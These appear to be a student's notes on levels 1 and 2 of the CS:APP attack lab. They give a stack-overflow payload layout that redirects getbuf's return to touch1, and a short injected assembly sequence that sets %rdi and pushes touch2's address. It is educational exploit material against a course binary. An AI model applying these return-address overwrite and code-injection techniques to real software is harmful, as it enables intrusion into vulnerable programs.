## CTARGET Level 1
---
basically just set the return address of Getbuf to the starting address of touch1

stack we want (the first 40 bytes can be anything without 0x0a):

| 00 | 00 | 00 | 00 | 00 | 40 | 17 | c0 |   0x5561dca0

| 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 |       

| 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 |

| 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 |

| 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 |

| 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 | 0x5561dc78

Hi <------------------------------------- low

## CTARGET Level 2
---

most important things: 

1. the value of %rsp should still be 0x5561dca8 even if we go to touch2 function.(can't pass the validate function)
2. the byte representation code produced by objdump is in little order.
3. when some part of the stack is deallocated, staffs stored there are not deleted, and we can still access it.

we just set the return address of Getbuf to be the starting address of the buffer located for the string, and at there we set the %rdi value, and push the starting address of touch2 to the stack(stored at 0x5561dca0), and return.

assembly code:
```
movq $0x59b997fa,%rdi
pushq $0x4017ec
ret
```